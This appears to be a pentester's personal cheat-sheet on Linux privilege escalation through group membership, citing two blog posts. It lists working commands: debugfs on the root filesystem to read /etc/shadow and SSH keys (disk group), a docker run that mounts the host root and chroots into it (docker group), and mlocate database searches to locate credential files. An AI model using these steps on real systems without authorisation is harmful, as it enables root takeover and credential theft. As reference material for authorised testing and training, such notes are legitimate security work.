https://steflan-security.com/linux-privilege-escalation-exploiting-user-groups/

Can be exploited
    sudo/admin/wheel
    video
    disk
	    df -h
	    then
	    whatever filesystem is mounted on /
	    debugfs <file_system>
	    mkdir test
	    cat <whatever_file_we_want> (consider ssh files, /etc/shadow, etc)
    shadow
    adm
    docker
	    `docker images
	    then
	    `docker run -v /:/mnt --rm -it <image> chroot /mnt sh``
    LXC/LXD


`staff` group
https://binaryregion.wordpress.com/2021/09/22/privilege-escalation-linux-staff-group/
allows users to add /usr/local modifications without root priv


`mlocate` group
	`find / -group mlocate 2>/dev/null | grep -v '^/proc\|^/run\|^/sys\|^/snap'`
		this will reveal the location of the mlocate database which contains all the files we may need
	`strings mlocate.db`
		this reveals all the files that can be LOCATED
		may need to transfer back mloacte.db to KALI machine to run `strings` on it
	example usage
		`strings mlocate.db | grep creds`
			creds-for-2022.txt
			we now know this file exists somewhere
			locate may uncover its location but if permissions are insufficient, locate will still not work
		